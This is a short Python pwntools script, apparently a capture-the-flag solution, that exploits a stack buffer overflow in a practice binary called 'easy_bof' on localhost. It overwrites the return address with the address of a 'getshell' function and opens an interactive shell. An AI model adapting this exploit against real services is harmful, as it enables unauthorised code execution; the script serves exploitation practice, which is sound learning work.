from pwn import *

elf = ELF('./easy_bof')

io = remote('localhost', 30001)
#io = process('./easy_bof')

getshell_addr = elf.symbols['getshell'] + 1

payload = b'A' * 0x20
payload += b'a' * 8
payload += p64(getshell_addr)

io.sendline(payload)
io.interactive()
